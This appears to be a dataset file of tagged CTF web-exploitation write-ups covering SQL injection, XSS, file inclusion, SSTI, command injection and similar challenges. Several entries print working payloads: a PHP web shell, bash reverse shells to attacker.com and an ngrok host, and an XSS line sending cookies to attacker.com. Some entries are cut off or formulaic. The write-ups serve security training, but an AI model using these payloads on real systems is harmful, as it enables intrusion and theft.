Upon submitting the payload, the application included the '/etc/passwd' file, confirming the presence of a File Inclusion vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the File Inclusion vulnerability to execute arbitrary code on the server. After researching the application's system and network configuration, I crafted a suitable payload containing PHP code that would execute arbitrary code on the server and send the output to an attacker-controlled server, such as <?php system($_GET['cmd']); ?>. This payload allowed me to execute arbitrary code on the server and obtain sensitive information, such as the contents of system files or database credentials.

#code
<?php system($_GET['cmd']); ?>

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against File Inclusion vulnerabilities by implementing proper input validation and output encoding controls, using whitelisting techniques, and validating user input. By exploiting the vulnerability, I was able to execute arbitrary code on the server, obtain sensitive information, complete the Web Exploitation challenge, and demonstrate the potential risks associated with File Inclusion.
"
"writeup_0024_tagged.txt","Web Exploitation","Title: Remote Code Execution (RCE) Vulnerability Exploitation
Primary topic: Web Exploitation
Secondary topic: Remote Code Execution (RCE)
Tools used: None
Keywords: system commands, payload, reverse shell

#context
During a CTF competition, I encountered a web application that included a user input feature allowing users to execute system commands on the server. Given the potential security risks associated with allowing users to execute system commands, I suspected that the application might be vulnerable to Remote Code Execution (RCE), a type of vulnerability that allows attackers to execute arbitrary code on the server.

#discovery
To test for RCE, I entered a malicious payload containing system commands into the user input parameter, such as ; ls -al, which would cause the application to execute the 'ls -al' command on the server.

#exploitation
Upon submitting the payload, the application executed the 'ls -al' command, confirming the presence of an RCE vulnerability. After researching the application's system and network configuration, I crafted a suitable payload containing a reverse shell command that would open a shell on the attacker-controlled server, such as ; bash -i >& /dev/tcp/attacker.com/1234 0>&1. This payload allowed me to execute arbitrary code on the server, obtain sensitive information, and establish a persistent backdoor to the server.

#code
`; ls -al`
`; bash -i >& /dev/tcp/attacker.com/1234 0>&1`

#discovery
To obtain the flag for the Web Exploitation challenge, I needed to use the RCE vulnerability to execute arbitrary code on the server and obtain sensitive information.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against Remote Code Execution vulnerabilities by implementing proper input validation and output encoding controls, using whitelisting techniques, and validating user input. By exploiting the vulnerability, I was able to execute arbitrary code on the server, obtain sensitive information, complete the Web Exploitation challenge, and demonstrate the potential risks associated with RCE.
"
"writeup_0025_tagged.txt","Web Exploitation","Title: Cross-Site Scripting (XSS) Vulnerability Exploitation
Primary topic: Web Exploitation
Secondary topic: Cross-Site Scripting (XSS)
Tools used: None
Keywords: session cookie, input validation, output encoding, content security policies

#context
During a CTF competition, I encountered a web application that included a search feature allowing users to search for specific products. Given the potential security risks associated with cross-site scripting (XSS) vulnerabilities, I suspected that the application might be vulnerable to XSS attacks.

#discovery
To test for XSS, I entered a malicious payload containing a JavaScript script into the search parameter, such as <script>alert('XSS');</script>, which would cause the application to execute the JavaScript script on the client-side.

#exploitation
Upon submitting the payload, the application executed the JavaScript script, confirming the presence of an XSS vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to steal the user's session cookie and impersonate the user.

#code
<script>new Image().src=""http://attacker.com/steal.php?cookie=""+document.cookie;</script>

#discovery
After researching the application's system and network configuration, I crafted a suitable payload containing a script that would steal the user's session cookie and send it to an attacker-controlled server, such as <script>new Image().src=""http://attacker.com/steal.php?cookie=""+document.cookie;</script>. This payload allowed me to steal the user's session cookie, impersonate the user, and gain access to the application's sensitive information.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against XSS vulnerabilities by implementing proper input validation and output encoding controls, using content security policies, and validating user input. By exploiting the vulnerability, I was able to steal the user's session cookie, impersonate the user, complete the Web Exploitation challenge, and demonstrate the potential risks associated with XSS.
"
"writeup_0026_tagged.txt","Web Exploitation","Title: File Inclusion Vulnerability Exploitation
Primary topic: Web Exploitation
Secondary topic: File Inclusion
Tools used: None
Keywords: path traversal, arbitrary code execution, input validation, output encoding, whitelisting

#context
During a CTF competition, I encountered a web application that included a file inclusion feature allowing users to include files on the server. Given the potential security risks associated with file inclusion vulnerabilities, I suspected that the application might be vulnerable to file inclusion attacks.

#discovery
To test for file inclusion, I entered a malicious payload containing a path traversal attack into the file inclusion parameter, such as ../../../../../../etc/passwd, which would cause the application to include the '/etc/passwd' file on the server.

#exploitation
Upon submitting the payload, the application included the '/etc/passwd' file, confirming the presence of a file inclusion vulnerability. After researching the application's system and network configuration, I crafted a suitable payload containing a script that would execute arbitrary code on the server and send the output to an attacker-controlled server, such as php://filter/convert.base64-encode/resource=index.php. This payload allowed me to execute arbitrary code on the server, obtain sensitive information, and establish a persistent backdoor to the server.

#code
None

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against file inclusion vulnerabilities by implementing proper input validation and output encoding controls, using whitelisting techniques, and validating user input. By exploiting the vulnerability, I was able to execute arbitrary code on the server, obtain sensitive information, complete the Web Exploitation challenge, and demonstrate the potential risks associated with file inclusion.
"
"writeup_0027_tagged.txt","Web Exploitation","Title: SQL Injection in User Login
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: credentials, authentication, database

#context
During a CTF competition, I encountered a web application that included a user login feature allowing users to login using their credentials. Given the potential security risks associated with SQL injection vulnerabilities, I suspected that the application might be vulnerable to SQL injection attacks.

#discovery
To test for SQL injection, I entered a malicious payload containing a SQL injection attack into the login parameter, such as admin' --, which would cause the application to execute a valid SQL query and bypass the authentication mechanism.

#exploitation
Upon submitting the payload, the application logged me in as an administrator, confirming the presence of an SQL injection vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the SQL injection vulnerability to extract sensitive information from the database.

#code
admin' UNION SELECT 1,2,3,4,5,6,7 FROM sensitive_table WHERE '1'='1.

#discovery
After researching the application's database schema and structure, I crafted a suitable payload containing a script that would extract sensitive information from the database, such as admin' UNION SELECT 1,2,3,4,5,6,7 FROM sensitive_table WHERE '1'='1. This payload allowed me to extract sensitive information from the database, such as the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of properly securing web applications against SQL injection vulnerabilities by implementing proper input validation and output encoding controls, using parameterized queries, and validating user input. By exploiting the vulnerability, I was able to extract sensitive information from the database, complete the Web Exploitation challenge, and demonstrate the potential risks associated with SQL injection.
"
"writeup_0001_tagged.txt","Web Exploitation","Title: Cookie Manipulation for Privilege Escalation
Topics: Web Exploitation
Vulnerabilities: Cookie Manipulation, Privilege Escalation
Tools used: Browser Developer Tools
Keywords: user_role, admin access, sensitive information

#context
During a recent CTF competition, I encountered a web application that allowed users to log in and view their account information. 

#discovery
After registering a regular user account, I started to analyze the cookies being set by the application. Upon logging in, I noticed a cookie named user_role with a value of user. This immediately caught my attention, as the cookie's name suggested that it might be related to user privileges.

#exploitation
I decided to manipulate the cookie value to see if I could escalate my privileges within the application. Using browser developer tools, I modified the user_role cookie value to admin and refreshed the page. Surprisingly, the application didn't seem to have any server-side validation of the cookie value, and I was granted admin access. With admin access, I was able to view sensitive information that was restricted to regular users. This allowed me to complete the Web Exploitation challenge by finding the flag hidden in the restricted admin area.

#countermeasures
In conclusion, this CTF writeup demonstrates the importance of server-side validation for cookies and user input. By simply manipulating a cookie value, I was able to escalate my privileges and gain unauthorized access to sensitive information. To prevent this type of attack, web developers should implement server-side validation of cookies and user input to ensure that only authorized users can access sensitive information."
"writeup_0002_tagged.txt","Web Exploitation","Title: Bypassing Client-Side Validation via JavaScript Console
Topics: Web Exploitation
Vulnerabilities: None
Tools used: None
Keywords: JavaScript Console, client-side validation, server-side validation

#context
In a recent CTF challenge, I stumbled upon a web application with a form that required user input. The form asked for an invite code, and it seemed that only users with a valid invite code could access the restricted area of the website.

#discovery
Upon inspecting the source code, I discovered that the form validation was being performed only on the client-side using JavaScript. This immediately caught my attention, as client-side validation can be easily bypassed.

#exploitation
I decided to use the browser's JavaScript console to manipulate the validation function directly. By doing so, I was able to bypass the client-side validation and submit the form without needing a valid invite code.

#context
To my surprise, after bypassing the validation, I was granted access to the restricted area of the website. Inside, I found the flag for the Web Exploitation challenge.

#countermeasures
This CTF writeup highlights the importance of implementing proper server-side validation alongside client-side validation. Relying solely on client-side validation can lead to security vulnerabilities, as attackers can easily manipulate and bypass the validation checks."
"01_basic_injection_tagged.txt","Web Exploitation","Title: Basic Injection
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: SQLi, input sanitization

#context
Just like the title said, the task involves SQL injection (SQLi), which I really have not yet studied. Let's begin.

#discovery
I have a little experience and understanding of SQL so my study was not long, the point is to make the request valid, for example 1=1 is always true, so the server will return all of the items. This challenge is really friendly and shows what is the resulting query, which helps a lot.

#exploitation
We need to make the query valid, but not really a big riddle, my resulting input is '' or 'a'='a and the missing ' will be added by the server. The payload going to pull all the data from the database. This is because the input field is not sanitized which makes the searching field vulnerable to the SQL injection. A hacker can pull all the information from a database that included sensitive data.
"
"02_post_practice_tagged.txt","Web Exploitation","Title: Post Practice
Primary topic: Web Exploitation
Secondary topic: HTTP Request Manipulation
Tools used: Burp Suite, curl
Keywords: POST request, HTTP-request header, username, password

#context
This is actually a very easy challenge if you know about HTTP, I don't know why the author gave it a Medium difficulty. Let's begin. From the description alone we understand what is the challenge about. Make a POST request, and pass login information, the question is how it should look like and what information we need to pass. In the page we don't see much, checking the source will give us the credentials for the login. Nicely commented us `username: admin | password: 71urlkufpsdnlkadsf` so now we know what are the parameters we need to send, and what are their values. 

#discovery
For this task, you are required to play around with the HTTP-request header. By using Burp Suite, the request is originally a GET. Our objective is to change the request from GET to POST. If you look at the response, you should find the username and password for the POST request. As I said the challenge is very easy, it's not even a hard thing to learn how POST request works and what is it. 
"
"03_dont_bump_your_header_tagged.txt","Web Exploitation","Title: Don't Bump Your Head(er)
Primary topic: Web Exploitation
Secondary topic: HTTP Header Manipulation
Tools used: Postman
Keywords: User-Agent, Referer

#context
When you visit the site, you can find the clue in the HTML code: ""Sorry, it seems as if your user agent is not correct, in order to access this website.""

#discovery
From the clue above, we have to change the User-Agent to Sup3rS3cr3tAg3nt before we send the request to the site. Using Postman, change the user agent and send GET request to /header.php. You will get this response: ""Sorry, it seems as if you did not just come from the site, 'awesomesauce.com'.""

#exploitation
You have to change the Referer in the header to awesomesauce.com then you send GET request again to /header.php. The response contains the flag in it.
"
"04_my_blog_tagged.txt","Web Exploitation","Title: My Blog
Primary topic: Web Development
Secondary topic: None
Tools used: Firefox Developer Tools
Keywords: storage

#context
This is a kind of very unique challenge. No vulnerability, no bug, just a clean blog site. Instead of a complete CTF challenge, this is a test of web development knowledge.

#discovery
If you read the text carefully, ""you may find a good application for your memory."" That is a hint for the challenge. When the dev talked about memory, it must be something to do with the storage.

#exploitation
Question is, how do we access the storage? It is simple, for Firefox browser, open the Developer Tools and go to storage.

#discovery
I find the flag in the storage.
"
"05_inj3ction_time_tagged.txt","Web Exploitation","Title: Inj3ction Time
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: SQLMap
Keywords: quotes, UNION attack

#context
This challenge is a website with a single input where we can search for an id.

#discovery
I'll check if the input is vulnerable. From the description you'll notice that there's SQLi. To check if the ID field is vulnerable to SQLi, the first payload I used was a simple 1', which returned no results. Then I tried 1 OR 1=1. It worked but did not give me anything interesting, so the flag must be somewhere else in the database. I started suspecting that the quotes character is blacklisted.

#discovery
Finding how many columns the query needs. Next, I started to look for how many columns the query needs to work. This information will be needed in a UNION attack.

#exploitation
So at this point, I just use SQLMap to enumerate the db. 

#countermeasures
We must first extract the names of the existing databases. The next step is to extract the database information (table, columns, flag).
"
"06_gobustme_tagged.txt","Web Exploitation","Title: Gobustme
Primary topic: Web Exploitation
Secondary topic: Directory Bruteforcing
Tools used: DirBuster
Keywords: wordlist

#context
The main idea is to bruteforce directories and files hidden in a website. We go to the URL and notice the Ghostbuster theme song, except ""Ghostbusters"" is replaced with ""Gobuster"". The site links Gobuster which explains what kind of software it is.

#discovery
This is a personal preference but DirBuster is a GUI while Gobuster is a CLI which makes DirBuster slightly more beginner friendly. At the bottom of the website, common.txt is provided. This is a wordlist for possible lists to brute force. Set up DirBuster by configuring it to go to the website and use common.txt as the wordlist. If your computer can handle it, check off ""Go Faster"". After running for a bit, DirBuster will give all the results.

#exploitation
Upon visiting /hide we see the message ""It was well hidden isn't it?"" and we get the flag.
"
"07_calculat3_m3_tagged.txt","Web Exploitation","Title: Calculat3 M3
Primary topic: Command Injection
Secondary topic: Web Exploitation
Tools used: Burp Suite
Keywords: calculator

#context
A simple command injection challenge will be demonstrated in this walkthrough. The site gives a calculator that you can click the buttons to input expression, then it will eval the expression and gives a result.

#discovery
I provided random input in this calculator and intercepted the request with BurpSuite. I got one parameter taking the values: expression: 5 * 6 

#exploitation
Try to get the contents in directory, set the expression to ;ls. Submit it to get a list of file names in result, the flag is the one starts with ctf.

#code
;ls

#countermeasures
This challenge demonstrates the importance of properly validating user input and preventing command injection attacks. It also highlights the need for secure coding practices and regular security testing to identify and address vulnerabilities in web applications.
"
"08_audioedit_tagged.txt","Web Exploitation","Title: AudioEdit
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: easyTAG
Keywords: mp3 metadata

#context
The challenge description said ""I made this cool site for editing audio files. Can you exploit it?"". After visiting the site, I got a simple page with written ""AudioEdit"" with the chance of upload a .mp3 audio file.

#discovery
The provided file will be uploaded and the discovered insertion statement in the db looks like this: `INSERT INTO audioedit (..., foo, bla, ...) VALUES (..., 'author','title'...);`.

#exploitation
In order to do an SQL-injection we have to create a special author and title field. I used easyTAG but of course you can use the tool of your choice to modify mp3 metadata. In order to inject and maintain a valid INSERT statement you can create a mp3 with the following metadata: `title  = """" (not important) author = a', (SELECT @@version))-- -b`, which creates the following statement. This gave us the database version.

#discovery
Next we wanted to know the tables name. And of course the columns names.

#exploitation
Finally we get the flag.

#code
```
INSERT INTO audioedit (..., foo, bla, ...) VALUES (..., 'a', (SELECT @@version))-- -b',''...);
```
"
"09_grid_it_tagged.txt","Web Exploitation","Title: Grid It!
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: PHP serialized object, PHP Object Injection, Blind SQL Injection, ASCII codes, binary search, MD5 hash

#context
We are given a register/login panel on a webpage. After logging in, we see a 2D plane where we can add or remove points. Requests go through ""controller.php?action="", with various actions available.

#discovery
We notice a PHP serialized object when deleting points. We try SQL Injection by modifying the object and all points disappear. We observe that the delete() function is invoked on the point object, hinting at PHP Object Injection. However, the classes containing the ::delete() method (Phar and PharData) seem useless for this task.

#exploitation
We return to SQL Injection, aiming for Blind SQL Injection since there's no output. Our goal is to fetch table and column names inside the database. We create queries with conditions based on the comparison of ASCII codes of characters in the desired data. We perform a binary search to find the correct characters and retrieve the entire name. We find two tables and six columns. We fetch the admin's password with a similar query and obtain an MD5 hash.

#countermeasures
After cracking the MD5 hash, we get the password: grapevine. Logging in as admin, we receive the flag: ctflearn{obj3ct_inj3ct1on}. The name is misleading as it wasn't an object injection, just object modification.
"
"10_prehashbrown_tagged.txt","Web Exploitation","Title: Prehashbrown
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: Burp Suite, SQLMap
Keywords: None

#context
In the site we have a search bar that is SQL Injection vulnerable.

#discovery
So, using Burpsuite, I capture the request header and saved as header.txt.

#discovery
I started to enumerate the database using SQLMap.
So, I tried to enumerate a certain table.

#exploitation
The flag is within the table and I dumped all information from the table.
Finally I get the flag!
"
"Crocodilu_tagged.txt","Web Exploitation","Title: Crocodilu
Topics: Web Exploitation, Information Gathering, HTML Injection, Bypassing Security
Vulnerabilities: Rate Limiting Bypass, HTML Sanitization Bypass, JSONP Endpoint Abuse
Tools used: Python Script, Burp Suite, Google's CSP evaluator
Keywords: OTP, Redis, BeautifulSoup, Content Security Policy, JSONP, exfiltration

#context
Description
Check out my new video sharing platform!
Gaining Access
The first thing we needed to do was to gain access to the application. We can register a new user, but attempting to log in as that user would result in a ""User not active"" error.

#discovery
Taking a look at `auth.py`, we would see that a successful password reset at `/reset_password` would set `user.active` to `True, allowing us to access the app.
To do so, we first have to request an OTP at `/request_code`. This sets `user.code` to a random 4-digit number.

#exploitation
If no rate limiting is enforced on `/reset_password`, a 4-digit OTP would be trivial to brute-force. However, in this case, rate limiting is enforced on a per-email basis through a Redis store.
When a guess at the OTP is made, the value for the corresponding email address is incremented by 1. After 3 attempts, any further attempts for the same email address are blocked.

#discovery
Interestingly, the SQL query that checks the OTP code uses the `LIKE` operator.
The final query is something like:
```
SELECT * FROM users WHERE email LIKE ""email"" AND code LIKE ""code""
```
which means that if we can insert the % wildcard at the start or end of either email or code, there's a good chance we can bypass the check in reasonable time.

#discovery
Unfortunately, `code` is checked using `code.isdigit()`. Let's see if we can get past `is_valid_email(email)` instead.
The regular expression does not allow for special characters like `%`. However, `re.match` only matches at the beginning of the string, so this still allows for wildcards at the end of the email.
""If zero or more characters at the beginning of string match the regular expression pattern, return a corresponding match object. Return `None` if the string does not match the pattern; note that this is different from a zero-length match.""
There are two possibilities here - the first one is to create many accounts sharing the same prefix in their emails, increasing the chance that any code would be valid for `some@email.prefix%`. Because the registration form is reCAPTCHA-protected, this is not possible.
The approach we take instead relies on the ability to add any number of % characters at the end of the email. Because `%` matches 0 or more characters, the query will yield the same result no matter how many `%` characters are added.
Using a Python script, we can brute force the entire OTP space within a few minutes.

#context
Bypassing HTML Sanitization
Now that we are in, where is the flag? When the container first starts up a post is made containing the flag. The post is admin-only, which means we need to stage a client-side attack against the admin.

#discovery
Our first hurdle is BeautifulSoup. Our HTML content is parsed and checked for any blacklisted tags. Combined with a restrictive CSP (Content Security Policy), this greatly restricts what we can do.

#exploitation
Luckily for us, the built-in `html.parser` does not treat malformed HTML the same way as a standards-compliant HTML5 parser would. There is a section dedicated to this in the BeautifulSoup version 4 documentation.
One trick to exploit this parser differential is through HTML comments. Consider the following payload:
```
<!--><script>alert(1)</script>-->
```
BeautifulSoup thinks that the comment spans the entire payload, ending at `-->`.
However, a HTML5 parser would accept `<!-->` as a valid comment. We can test this out on any modern browser using a DOM viewer.

#context
Abusing YouTube JSONP Endpoint
Now that we can inject arbitrary HTML, we have to get past the rather restrictive CSP that is applied on all pages through the Nginx proxy.

#discovery
Throwing this into Google's CSP evaluator shows us that `www.youtube.com` might host JSONP (JSON with Padding) endpoints that we can abuse.

#exploitation
If so, we could use something like:
```
<script src=""https://www.youtube.com/some_jsonp_endpoint?callback=alert""></script>
```
to achieve an XSS.

#discovery
But where? The evaluator is checking against a pre-defined list of known JSONP endpoints. The only one that matches `www.youtube.com` is:
```
""//www.youtube.com/profile_style""
```
which seems to be outdated because visiting that URL just brings us to a YouTube profile called ""Profile Style"".

#exploitation
At this point, I tried getting Burp Suite to insert a `callback=` parameter to all JSON endpoints requested using an extension like `jsonp` and using YouTube as a normal user, hoping to get lucky.
Alas, this did not yield any results. After sleeping off my frustration, I came back to this challenge when my teammate sent a link to an obscure issue on Google's issue tracker.
This didn't seem very helpful. After all, Google decided not to implement JSONP on the `/oembed` API, right? Using the `callback` parameter seems to have no effect.

#discovery
But when I randomly tried using `alert();` instead of `alert`, was returned a response.

#exploitation
Wait, did I just trigger a JSONP response? For some reason, using a ""valid"" callback name does not elicit a JSONP response, but an ""invalid"" one yields a JSONP response saying that the callback name is invalid. That's really weird and ironic.
With our `callback` parameter reflected into the response, we can now inject arbitrary JavaScript code. The only restrictions are that quotes and angle brackets are escaped.
To exfiltrate the contents of the admin's `/profile` page, we use a specific `callback` value.
Combined with the BeautifulSoup bypass above, we create the final payload we submit.
We can then find the URL of the post containing the flag, and repeat this one more time to fetch the URL post, we get the flag.
"
"secrets_tagged.txt","Web Exploitation","Title: secrets
Topics: Web Exploitation
Vulnerabilities: Cross-Site Scripting (XSS), CSP Violation, XS-Leak
Tools used: None
Keywords: SameSite, XS-Leak, URL length limit

#context
Overview
A secure and secret note storage system is a platform or application designed to keep your confidential notes safe from unauthorized access. The challenge revolved around searching contents of secret notes. 
The challenge revolved around searching contents of secret notes.

#discovery
Let's examine the behaviour of the search feature.
When searching for a note through `/search?query=<query>`, there are two possible responses:
1. The note was found.
In this case, a 301 redirect is issued to `http://results.wtl.pw/results?ids=<note UUIDs>&query=<query>`.
It is important to note that this is a redirect to a different subdomain. Searching on `secrets.wtl.pw` redirects to `results.wtl.pw`.
2. The note was not found.
In this case, a 301 redirect is issued to `http://secrets.wtl.pw/#<query>`.

#discovery
Unintended Solution - Chrome's 2MB URL Limit
One thing that might be immediately noticeable is that if the note was found, then the resulting URL length is extended considerably by the `ids` parameter.
A well-known technique in these kinds of scenarios is hitting the server's maximum URL limit, and detecting error status codes. However, these rely on `SameSite=None` cookies for the error event detection.
The challenge had `SameSite=Lax` cookies, so the primitive for any XS-Leak attack is a top-level navigation (e.g. through `window.open`). There is no way to detect server response codes in a cross-origin window reference, so I started looking for other ways to detect the URL inflation.
We might not be able to detect a server-side URL length error, but can we somehow detect a client-side one? According to Chromium documentation, Chrome's maximum URL length is 2MB:
""In general, the web platform does not have limits on the length of URLs (although 2^31 is a common limit). Chrome limits URLs to a maximum length of 2MB for practical reasons and to avoid causing denial-of-service problems in inter-process communication.""

#exploitation
This is where it gets interesting! Because this is a client-side constraint, and URL fragments persist on redirects, we can open `/search?query=<query>#AAA...[2MB]...AAA` to hit the length limit.
So, what happens when the URL limit is exceeded?
Apparently, it shows an `about:blank#blocked` page.
As you might expect, trying to access the `origin` (or any other sensitive information) of a cross-origin window reference would raise an exception.

#discovery
However, when opening a page that errors out due to the 2MB constraint, the window's `origin` remains that of the parent.

#exploitation
As an experiment, let's try a successful query.
The length of the opened URL is exactly 2MB - 1, so the initial search URL is just under the length limit.
When the window is redirected to:
```
http://results.wtl.pw/results?ids=<note UUIDs>&query=test#AAA...AAA
```
the URL is extended and the length limit is hit. The window becomes an `about:blank` page and its `origin` remains that of the parent.
Now, if we try the same thing on an unsuccessful query, the final redirected URL falls short of the 2MB limit and the window's `origin` is no longer accessible.

#discovery
This can be extended to the following PoC, which brute-forces a character of the flag.
Because this PoC only tells us what is definitely not the flag (by detecting the `w.origin` errors), we can implement a backend server to quickly find what is the flag by eliminating the unsuccessful queries from the charset.
The downside of this method is that the long URLs can cause significant lag on the server's admin bot. This may or may not have made the bot extremely unstable for a period of time... oops!

#exploitation
Intended Solution - CSP Violation
It turns out that there is a much faster and less laggy way of detecting the redirects. Because the redirect is to a different origin, we can use CSP violations as an oracle.
Because the query was successful, the window attempted to load `http://results.wtl.pw`. But since our CSP dictates that forms can only be submitted to `http://secrets.wtl.pw`, the request was blocked. We can detect this through the `securitypolicyviolation` event listener.
"
"02_friends_tagged.txt","Web Exploitation","Here's the tagged version of the provided writeup text:

```
Title: Dockerized Web Application Challenge
Primary topic: Web Exploitation
Secondary topic: JavaScript
Tools used: Docker, Prettier.io
Keywords: login, follow, unfollow, admin account, comma operator, __proto__

#context
"
"01_Pirate_birthday_planner_tagged.txt","Web Exploitation","Title: NoSQL Injection in Party App
Primary topic: Web Exploitation
Secondary topic: NoSQL Injection
Tools used: None
Keywords: cookie, session, Content-Type, application/json

#context
The portion of code to check if a user is authorized in the party is done in this middleware.

#discovery
The query is vulnerable to NoSQL injection, but we need to set both session.user and session.pin to a js object controlled by us. The session is stored in a cookie created with the cookie-session library, and it needs a signature with a random key, so we should find a way to get it from the server. When using the app in the intended way, the browser sends the requested data with Content-Type: application/x-www-form-urlencoded. However, the server also loads a middleware to interpret the application/json content type. Thanks to it, we can send data as JSON, injecting objects inside the input parameters of the server.

#exploitation
Our first try was the /new endpoint. Here we confirmed that it's possible to set as a pin an object like {""$ne"":""a""} and bypass the check. However, this endpoint calls the trim() function on the user parameter, making it unusable for the exploitation. We need to set both session.user and session.pin to an object to bypass the checks. We used two sessions in parallel to get the exploit working, a legit session and a session for the payload. First, we create a party in the legit session with valid values. Then, in the other session, we create a party sending the admin parameter equal to the object {""$ne"":""a""}. The creation of the party will fail, but the session values are updated anyway. In this way, we set session.user to the bypass object. However, we have a random value in session.pin, but we can't change it"
"01_Evaluation_Deck_tagged.txt","Web Exploitation","Title: Arbitrary Code Execution in Ghost Game
Primary topic: Web Exploitation
Secondary topic: Code Injection
Tools used: Burp Suite, ngrok
Keywords: Python, exec function, reverse shell

#context
Navigating to the challenge website, it presents the following page which list cards.

#discovery
On selecting a card, the HP of ghost increases of decrease depending on the points and operator. Intercepting the requests with burpsuite, when selecting a card, post request is sent to /api/get_health endpoint with three parameters as shown below.

#code
```
POST /api/get_health HTTP/1.1
Host: localhost:8080
Content-Length: 29
Content-Type: application/x-www-form-urlencoded
Connection: close

current_health=100&attack_power=100&operator=+
```

#context
In response, remaining health is sent. Looking into the source code, the three POST parameters are directly passed into the compile function which creates code format for exec function. The exec function in python allows to execute arbitrary python code. So, the lack of input validation means we can inject arbitrary code in this function and execute it.

#exploitation
Since, current_health and attack_power are passed into int function, injecting code into them will cause issue. But, the operator parameter is directly passed as string so we can use it. We can confirm this by commenting the attack_power parameter. Basically the following payload will look like this: `100 - 100# 34`. So, we can inject code before the comment.

#code
```
operator=.__class__.__base__.__subclasses__()[59]('/bin/bash', '-c', 'bash -i >& /dev/tcp/0.tcp.ngrok.io/12345 0>&1')
```

#discovery
Start the ngrok proxy which forward requests to local port 8080. Start listening on port 8080 to receive connection. Injection the following payload gives a reverse shell on the challenge container.

#countermeasures
The vulnerability in this challenge is caused by the lack of input validation and sanitization. To prevent arbitrary code execution vulnerabilities, it's essential to validate and sanitize all user input, especially when it's used to create dynamic code."
"02_Spookifier_tagged.txt","Web Exploitation","Title: Server Side Template Injection in Flask App
Primary topic: Web Exploitation
Secondary topic: Server Side Template Injection
Tools used: None
Keywords: flask, mako, font, SSTI

#context
Navigating to website, we are presented with the following page.

#discovery
On giving an input, it is sent through get parameter and it reponds with same input with different font styles.

#context
Looking into the source code reveals that its a flask app and using mako template engine for rendering. On line 11, the user input is passed into the spoofiky function and its output is passed into the template.

#code
Tracing the spookify function, it passes the text onto change_font function which just maps the text characters againts different font dictionaries. One font dictionary does not have any unique character for mapping.

#exploitation
Since, the user input is directly passed into the template with any sanitization, this introduces the Server Side Template Injection (SSTI). We confirm it by using the following payload and it sucessfully evaluates it.

#code
{{7*7}}

#exploitation
Then using the following payload, we can run commands on the system and read our flag. 

#code
{{''.__class__.__mro__[1].__subclasses__()[414]('/bin/sh',shell=True,stdout=-1).communicate()[0].strip()}}
"
"03_Horror Feeds_tagged.txt","Web Exploitation","Title: SQL Injection in Login Page
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: CCTV footage, docker, SQL injection, ON DUPLICATE KEY UPDATE, bcrypt

#context
Starting the challenge container, we are presented with the following login page which also presents option to register.

#discovery
Looking into the provided zip file, there's the docker startup script which creates the users table and adds the admin user entry. The password is hashed.

#context
Registering the new user and logging in, on the home page it shows spooky CCTV footage as told in the challenge description. There's nothing more.

#context
Then, this flag and authenticated username is passed into the dashboard template. But, we saw the dashboard after but there was no flag. The reason is that there's a condition in the template that flag will only be rendered when admin logs into the dashboard. This means that we need to be admin to get the flag.

#exploitation
Looking in the register function, the username is directly passed to the SQL query without any sanitization. This introduces the SQL injection. First query on line 30 doesn't concern us because the passwords are hashed and we already have hash of admin password but it's of no use. But the second query of line 36 is interesting. Since this is an insert query and there's no input validation, we can use it to change the admin's password hash to our own generated hash. This can be done by using the ON DUPLICATE KEY UPDATE which is an extension to insert statement that, if it finds a duplicate unique or primary key, it will instead perform an update.

#code
So, the logic is to try to add admin user which we know already exists in the table, so on duplicate key, we can change its hash. You can read more about it on the following page:

#code
https://dev.mysql.com/doc/refman/8.0/en/insert-on"
"04_Juggling_Facts_tagged.txt","Web Exploitation","Title: Type Juggling in GetFacts Endpoint
Primary topic: Web Exploitation
Secondary topic: PHP
Tools used: Burp Suite
Keywords: type juggling, switch statements, loose comparison

#context
Opening the challenge website, we get the following page. It presents three buttons on the right to see other facts.

#discovery
Clicking on secret facts, it says, can only be accessed by admin. Looking at the Burp Suite proxy, under the hood, it is sending a post request to the getfacts endpoint with the fact type parameter.

#code
Looking into the source code, the getfacts endpoint is controlled by the getfacts function. The getfacts function basically has two main things. First, there's an if statement that checks if the request fact type is secret and the request is not coming from localhost, then return the message that we saw earlier in the response. Second, there's a switch statement which checks the type and returns the facts.

#exploitation
The switch statements in PHP use loose comparison (==). By providing the true keyword in the type parameter, the first switch case becomes true and presents the secrets and the flag.

#countermeasures
This challenge demonstrates the importance of proper input validation and sanitization to prevent vulnerabilities such as type juggling. It also highlights the need for secure coding practices and the use of strict comparison (===) in switch statements."
"05_Cursed_Secret_Party_tagged.txt","Web Exploitation","Title: XSS in Halloween Form
Primary topic: Web Exploitation
Secondary topic: Cross-Site Scripting (XSS)
Tools used: Burp Suite, GitHub, Webhook.site
Keywords: CSP, JWT, cookie

#context
Starting the challenge, we get the following page which presents a form. Submitting the form, it says that request will be reviewed by team. Looking into the burpsuite proxy, it is posting data to the submit endpoint. Tracing into the source code, this endpoint adds the post data in the database and calls a visit function from bot. The other endpoint is /admin which gets the data from db and passes it into the admin template and /admin/delete_all endpoint deletes all the data from db.

#discovery
Looking into the visit function which is called when we submit the form. It first creates a headless browser and it signs and sets an admin JWT which contains flag. This gives the idea that we need to steal this admin cookie. Then it visits the /admin page which displays all the data from db and then it calls delete_all endpoint which deletes all data from db.

#exploitation
Now, that we know that we need to steal admin cookie and also the admin is rendering the user input data, we can perform XSS to grab the cookie. Looking in the admin template which displays the form data to admin, the halloween name field is marked safe which means it will not escape character, so we can inject our js code in it. But the problem is that it has a CSP header which we need to bypass for our XSS to work. Understanding the CSP that script source is set to self and jsdelivr CDN which means it will only trust JS"
"01_Get_aHEAD_tagged.txt","Web Exploitation","Title: Get aHEAD
Topics: Web Exploitation, Information Gathering
Vulnerabilities: Improper use of HTTP request methods
Tools used: Burp Suite
Keywords: HTTP method, HEAD, MDN Web Docs

#context
